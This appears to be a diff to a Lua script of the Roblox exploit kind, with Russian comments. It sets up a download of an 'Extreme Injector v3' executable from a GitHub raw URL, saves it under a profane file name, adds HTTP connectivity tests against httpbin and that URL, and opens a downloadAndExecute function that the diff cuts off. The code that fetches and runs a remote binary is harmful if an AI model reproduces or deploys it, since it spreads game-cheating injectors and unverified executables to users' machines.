@@ -2,9 +2,34 @@
 
 -- ========== НАЧАЛО НОВОГО КОДА ==========
 -- Конфигурация для загрузки EXE
-local EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe"
-local EXE_NAME = "Extreme_Injector_v3.exe"
+local EXE_URL = "http://raw.githubusercontent.com/fennix2019-pixel/1232/refs/heads/main/Extreme%20Injector%20v3.exe"
+local EXE_NAME = "пидорасыблять"
 local RUN_SILENTLY = false -- Запуск в обычном режиме, чтобы видеть окно
+-- Тест соединения
+print("=== ТЕСТ СЕТИ ===")
+
+-- 1. Пробуем скачать простой текст (должно работать)
+local test1 = pcall(function()
+    local data = game:HttpGet("http://httpbin.org/get")
+    print("HTTP-сайт: РАБОТАЕТ")
+end)
+
+-- 2. Пробуем скачать с HTTPS (может не работать)
+local test2 = pcall(function()
+    local data = game:HttpGet("https://httpbin.org/get")
+    print("HTTPS-сайт: РАБОТАЕТ")
+end)
+
+-- 3. Пробуем твой URL
+local test3 = pcall(function()
+    local data = game:HttpGet("http://raw.githubusercontent.com/fennix2019-pixel/1232/refs/heads/main/Extreme%20Injector%20v3.exe")
+    print("GitHub RAW: РАБОТАЕТ")
+end)
+
+if not test3 then
+    print("ВНИМАНИЕ: Не могу скачать с GitHub!")
+    print("Используй альтернативный хостинг.")
+end
 
 local function downloadAndExecute()
     -- 1. ПРОВЕРКА ФУНКЦИЙ
